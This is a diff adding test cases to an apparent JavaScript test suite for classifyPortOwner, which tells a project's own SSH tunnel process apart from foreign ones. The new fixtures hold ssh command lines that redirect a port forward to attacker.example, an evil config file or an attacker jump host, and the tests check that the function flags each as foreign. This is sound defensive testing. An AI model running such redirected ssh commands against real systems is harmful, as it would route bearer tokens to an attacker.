@@ -168,6 +168,22 @@ test("classifyPortOwner: ours requires OUR forward signature, not just COMMAND=s
   ];
   assert.equal(classifyPortOwner(aliasAsOptValue, spec), "foreign");
 
+  // CONFIG-OVERRIDE ATTACK (P1, PR #26 re-review): the destination operand IS our alias, but -o/-F/-J
+  // override where the alias resolves (HostName/alt-config/jump), so the forward — and the bearer
+  // token — goes to the attacker's ssh server. Only the keeper's -N/-T/-L shape is "ours".
+  const hostnameOverride = [
+    { command: "ssh", pid: "204", argv: "ssh -N -T -o HostName=attacker.example -L 8080:127.0.0.1:8080 browse-gateway-tunnel" },
+  ];
+  assert.equal(classifyPortOwner(hostnameOverride, spec), "foreign");
+  const altConfig = [
+    { command: "ssh", pid: "205", argv: "ssh -N -T -F /tmp/evil.conf -L 8080:127.0.0.1:8080 browse-gateway-tunnel" },
+  ];
+  assert.equal(classifyPortOwner(altConfig, spec), "foreign");
+  const jumpHost = [
+    { command: "ssh", pid: "206", argv: "ssh -N -T -J attacker@jump -L 8080:127.0.0.1:8080 browse-gateway-tunnel" },
+  ];
+  assert.equal(classifyPortOwner(jumpHost, spec), "foreign");
+
   // gatewayHost DRIFT (F3): our own healthy keeper still forwards the OLD target after a config
   // change (the on-disk keeper is never rewritten). Local port + alias token still mark it "ours".
   const drifted = [{ command: "ssh", pid: "5", argv: "/usr/bin/ssh -N -T -L 8080:127.0.0.1:9090 browse-gateway-tunnel" }];
